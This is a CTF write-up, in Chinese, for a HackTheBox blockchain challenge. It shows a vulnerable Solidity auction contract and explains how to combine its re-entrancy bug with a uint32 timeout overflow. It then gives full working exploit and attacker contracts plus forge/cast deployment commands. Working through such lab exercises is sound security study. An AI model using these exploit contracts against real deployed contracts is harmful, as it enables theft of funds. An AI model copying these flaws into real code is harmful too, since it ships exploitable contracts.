---
title: HTB Blockchain Challenge - False Bid
date: {{ date }}
cover   : "/img/htb2.jpeg"
tags: Blockchain SmartContract Exploit
---

False Bidding
===
### Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;
pragma abicoder v2;

contract AuctionHouse {
    struct Key {
        address owner;
    }

    struct Bidder {
        address addr;
        uint64 bid;
    }

    Key private phoenixKey = Key(address(0));
    uint32 public timeout;
    Bidder[] public bidders;
    mapping(address => bool) private blacklisted;
    uint32 public constant YEAR = 31556926;

    constructor() payable {
        timeout = uint32(block.timestamp);
        _newBidder(msg.sender, 0.5 ether);
    }

    receive() external payable {
        if ((uint64(msg.value) >= 2 * topBidder().bid) && (msg.sender != topBidder().addr) && (!blacklisted[msg.sender])&& (_isPayable(msg.sender))) {
            _newBidder(msg.sender, uint64(msg.value));
            timeout += YEAR;
        }
    }

    function keyOwner() external view returns (address) {
        return phoenixKey.owner;
    }

    function keyTransfer(address _newOwner) external {
        require(msg.sender == phoenixKey.owner);
        phoenixKey.owner = _newOwner;
    }

    function topBidder() public view returns (Bidder memory) {
        return bidders[bidders.length - 1];
    }

    modifier topBidderOnly() {
        require(msg.sender == topBidder().addr);
        _;
    }

    function withdrawFromAuction() public topBidderOnly {
        Bidder memory withdrawer = topBidder();
        bidders.pop();

        (bool success,) = payable(withdrawer.addr).call{value: withdrawer.bid / 2}("");
        if (success) {
            blacklisted[withdrawer.addr] = true;
            blacklisted[tx.origin] = true;
        }
    }

    function claimPrize() public topBidderOnly {
        require(uint32(block.timestamp) > timeout, "Still locked");
        require(phoenixKey.owner == address(0));
        phoenixKey.owner = topBidder().addr;
    }

    function _newBidder(address _address, uint64 _bid) private {
        bidders.push(Bidder(_address, _bid));
    }

    function _isPayable(address _address) private returns (bool) {
        (bool success,) = payable(_address).call{value: 0}("");
        return success;
    }
}

```

### 分析
* 很明顯可以看到在 `withdrawFromAuction` 裡存在 Re-entrancy Attack

```solidity
function withdrawFromAuction() public topBidderOnly {
        Bidder memory withdrawer = topBidder();
        bidders.pop();

        (bool success,) = payable(withdrawer.addr).call{value: withdrawer.bid / 2}("");
        if (success) {
            blacklisted[withdrawer.addr] = true;
            blacklisted[tx.origin] = true;
        }
    }
```

* 可以透過 `payable(withdrawer.addr).call{value: withdrawer.bid / 2}("");` 進入 fallback function 執行 Re-entrancy
* 但是無法直接新增bidder
* 觀察recieve()

```solidity=
if ((uint64(msg.value) >= 2 * topBidder().bid) && (msg.sender != topBidder().addr) && (!blacklisted[msg.sender])&& (_isPayable(msg.sender))) {
    _newBidder(msg.sender, uint64(msg.value));
    timeout += YEAR;
}

```
* 有以下幾個條件
    * msg.valu >= 2* topBidder().bid
        * 初始bid為 0.5 ether
        * 也就是我們要先儲值1 ether 到exploit合約
        * 然後花費 1 ether 去 bid    
    * msg.sender != topBidder().addr
        * 新建立合約
    * !blacklisted[msg.sender]
        * 沒有被列入blacklist -> 沒有withdraw
    * _isPayable(msg.sender)
        * payable contract
        * 有fallback function
* withdrawFromAuction
    * payable(withdrawer.addr).call{value: withdrawer.bid / 2}(""); 
* 但仔細觀察可以發現，這題不是只有要觸發reentrancy
* 而是在bid之後，會設定一個timeout
* 程式使用uint32，稍微計算一下之後可以發現，大約執行81次之後會integer overflow，也就會回到31556926，如此一來便可以執行ClaimPrize
* 但是題目給的account只有30ether
* 要想辦法再60次內讓 uint32 timeout integer overflow
* 但是!!!
* 但是!!!
* 題目的 timeout是3821613406(0x00e3c9315e)
* 所以執行15次就可以了
* 但由於執行integer overflow會導致contract無法再進行bid
* 因此我們需要生成另一個新的合約來transferKey
* 可以使用另一個合約來建構原本的Exploit合約來一次性地完成攻擊






### Exploit

* Exploit.sol
```solidity=
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;
pragma abicoder v2;
import {Setup} from './Setup.sol';
import {AuctionHouse} from './AuctionHouse.sol';


contract Exploit{
    Setup setup;
    AuctionHouse auctionhouse;
    uint32 public count = 0;
    bool public reentrancy ;

    constructor(Setup _setup) payable{
        require(msg.value >= 1 ether);
        setup = _setup;
        auctionhouse = _setup.TARGET();
    }
    receive() external payable{

        if(msg.value != 0 ){
            if(count <= 15){
                // new bidder
                count += 1;
                payable(auctionhouse).call{value: 1 ether}("");
                // withdraw
                auctionhouse.withdrawFromAuction();
            }
        }
            /*else{
                payable(auctionhouse).call{value: 1 ether}("");
                auctionhouse.claimPrize();

            }
            */

    }
    function exploit() public{
        // bid
        payable(auctionhouse).call{value: 1 ether}("");
        withdraw();
    }
    function retrievePrize() public {
        payable(auctionhouse).call{value: 1 ether}("");
        claim();
        transferKey();
    }
    function claim() public {
        auctionhouse.claimPrize();
    }
    function transferKey() public {
        auctionhouse.keyTransfer(address(this));
    }
    function withdraw() public {
        auctionhouse.withdrawFromAuction();
    }
    function transfer(address _player) public {
        auctionhouse.keyTransfer(_player);
    }
    function withdrawEther() external payable{
        payable(msg.sender).call{value: address(this).balance}("");
    }
}

```

* Attacker.sol
```solidity=

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import {Exploit} from './Exploit.sol';
import {Setup} from './Setup.sol';
import {AuctionHouse} from './AuctionHouse.sol';

contract Attacker{
    Setup setup;
    address[] public exp_addr;
    constructor(Setup _setup) payable  {
        setup = _setup;
    }
    // accept money
    receive() external payable {
    }

    function attack() public {
        Exploit exp = new Exploit{value:20 ether}(setup);
        exp_addr.push(address(exp));
        exp.exploit();
        exp.withdrawEther();
    }
    function attack2(address _player) public {
        Exploit exp = new Exploit{value:1 ether}(setup);
        exp.retrievePrize();
        exp.transfer(_player);
    }
    function complete_attack(address _player) public {
        attack();
        attack2(_player);
    }
}

```

* deploy contract
    * `forge create src/Attacker.sol:Attacker --rpc-url http://159.65.20.166:32026/rpc --private-key {{private key}} --value 25ether --constructor-args "0x5557a3c564A9D35F2c3CCc3bC53Fc2617b117f64"`
* Exploit
    * `cast send  --rpc-url http://159.65.20.166:32026/rpc --private-key {{private key}} 0x7828aF85c4C0638419a9e0564Ec7942A197bf279 "complete_attack(address)" 0x57Eea081F89f3924F8c429D0D5f4b4B53317dA62`
* Check is solved
    * `cast call  --rpc-url http://159.65.20.166:32026/rpc --private-key {{private key}} 0x5557a3c564A9D35F2c3CCc3bC53Fc2617b117f64 "isSolved(address)"  0x57Eea081F89f3924F8c429D0D5f4b4B53317dA62`

